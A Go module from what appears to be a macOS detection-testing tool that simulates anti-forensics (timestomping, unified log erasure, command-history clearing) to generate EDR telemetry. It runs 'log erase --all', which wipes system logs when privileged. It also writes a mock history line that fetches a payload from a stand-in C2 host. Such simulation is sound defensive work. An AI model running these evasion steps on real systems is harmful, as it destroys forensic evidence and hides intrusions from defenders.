package evasion

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"

	"github.com/0xv1n/macnoise/internal/output"
	"github.com/0xv1n/macnoise/pkg/module"
)

const defaultEvasionStageDir = "/tmp/macnoise_evasion"

type evadeLogClear struct {
	stageDir string
}

func (e *evadeLogClear) Info() module.ModuleInfo {
	return module.ModuleInfo{
		Name:        "evade_log_clear",
		EventTypes:  []string{"file_timestomp", "log_erase_attempt", "history_clear"},
		Description: "Timestomps a file, attempts unified log erasure, and clears a mock history file to generate defense evasion telemetry",
		Category:    module.CategoryEvasion,
		Tags:        []string{"evasion", "anti-forensics", "timestomp", "log-clear", "history"},
		Privileges:  module.PrivilegeNone,
		MITRE: []module.MITRE{
			{Technique: "T1070", SubTech: ".006", Name: "Indicator Removal: Timestomp"},
			{Technique: "T1070", SubTech: ".002", Name: "Indicator Removal: Clear Linux or Mac System Logs"},
			{Technique: "T1070", SubTech: ".003", Name: "Indicator Removal: Clear Command History"},
		},
		Author:   "0xv1n",
		MinMacOS: "12.0",
	}
}

func (e *evadeLogClear) ParamSpecs() []module.ParamSpec {
	return []module.ParamSpec{
		{
			Name:         "stage_dir",
			Description:  "Directory for staging evasion artifacts",
			Required:     false,
			DefaultValue: defaultEvasionStageDir,
			Example:      "/var/tmp/macnoise_evasion",
		},
	}
}

func (e *evadeLogClear) CheckPrereqs() error { return nil }

// timestomp creates a file and sets its mtime to a date in the past.
// The os.Chtimes call generates the utimes syscall that an EDR fires on,
// and is cross-platform testable unlike touch -t.
func timestomp(info module.ModuleInfo, target string) module.TelemetryEvent {
	if err := os.WriteFile(target, []byte("macnoise timestomp target\n"), 0o644); err != nil {
		ev := output.NewEvent(info, "file_timestomp", false,
			fmt.Sprintf("failed to create timestomp target: %s", target))
		return output.WithError(ev, err)
	}

	past := time.Date(2000, 1, 1, 0, 0, 0, 0, time.UTC)
	err := os.Chtimes(target, past, past)
	if err != nil {
		ev := output.NewEvent(info, "file_timestomp", true,
			fmt.Sprintf("timestomp denied: %s", target))
		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
		return output.WithDetails(ev, map[string]any{
			"path":         target,
			"target_mtime": past.Format(time.RFC3339),
			"technique":    "T1070.006",
		})
	}

	ev := output.NewEvent(info, "file_timestomp", true,
		fmt.Sprintf("timestomped %s to %s", target, past.Format("2006-01-02")))
	return output.WithDetails(ev, map[string]any{
		"path":         target,
		"target_mtime": past.Format(time.RFC3339),
		"technique":    "T1070.006",
	})
}

// logErase attempts `log erase --all`. Without root this fails, and the
// denied exec is exactly the telemetry a detection should fire on.
func logErase(ctx context.Context, info module.ModuleInfo) module.TelemetryEvent {
	out, err := exec.CommandContext(ctx, "log", "erase", "--all").CombinedOutput()
	if err != nil {
		ev := output.NewEvent(info, "log_erase_attempt", true,
			"log erase --all denied (expected without root)")
		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
		return output.WithDetails(ev, map[string]any{
			"command":   "log erase --all",
			"output":    string(out),
			"technique": "T1070.002",
		})
	}

	ev := output.NewEvent(info, "log_erase_attempt", true,
		"log erase --all succeeded")
	return output.WithDetails(ev, map[string]any{
		"command":   "log erase --all",
		"output":    string(out),
		"technique": "T1070.002",
	})
}

// clearHistory creates a mock history file and removes it. The unlink
// generates the file-deletion telemetry that history-clearing detections
// key on, without touching the user's real shell history.
func clearHistory(info module.ModuleInfo, stageDir string) module.TelemetryEvent {
	histFile := filepath.Join(stageDir, ".zsh_history")
	if err := os.WriteFile(histFile, []byte("echo secret-command\ncurl http://c2.evil.invalid/payload\n"), 0o600); err != nil {
		ev := output.NewEvent(info, "history_clear", false,
			fmt.Sprintf("failed to create mock history: %s", histFile))
		return output.WithError(ev, err)
	}

	err := os.Remove(histFile)
	if err != nil {
		ev := output.NewEvent(info, "history_clear", true,
			fmt.Sprintf("mock history removal denied: %s", histFile))
		ev = output.WithOutcome(ev, module.OutcomeDenied, err)
		return output.WithDetails(ev, map[string]any{
			"path":      histFile,
			"technique": "T1070.003",
		})
	}

	ev := output.NewEvent(info, "history_clear", true,
		fmt.Sprintf("mock history cleared: %s", histFile))
	return output.WithDetails(ev, map[string]any{
		"path":      histFile,
		"technique": "T1070.003",
	})
}

func (e *evadeLogClear) Generate(ctx context.Context, params module.Params, emit module.EventEmitter) error {
	info := e.Info()
	stageDir := module.TagPath(params.Get("stage_dir", defaultEvasionStageDir), module.RunIDFromContext(ctx))
	if err := os.MkdirAll(stageDir, 0o755); err != nil {
		return fmt.Errorf("mkdir %s: %w", stageDir, err)
	}
	e.stageDir = stageDir

	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}
	emit(timestomp(info, filepath.Join(stageDir, "timestomp_target")))

	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}
	emit(logErase(ctx, info))

	select {
	case <-ctx.Done():
		return ctx.Err()
	default:
	}
	emit(clearHistory(info, stageDir))

	return nil
}

func (e *evadeLogClear) DryRun(params module.Params) []string {
	stageDir := params.Get("stage_dir", defaultEvasionStageDir)
	return []string{
		fmt.Sprintf("mkdir -p %s", stageDir),
		fmt.Sprintf("touch -t 200001010000 %s/timestomp_target (T1070.006)", stageDir),
		"log erase --all (T1070.002, requires root)",
		fmt.Sprintf("create and remove %s/.zsh_history (T1070.003)", stageDir),
	}
}

func (e *evadeLogClear) Cleanup() error {
	if e.stageDir == "" {
		return nil
	}
	return os.RemoveAll(e.stageDir)
}

func init() {
	module.Register(&evadeLogClear{})
}
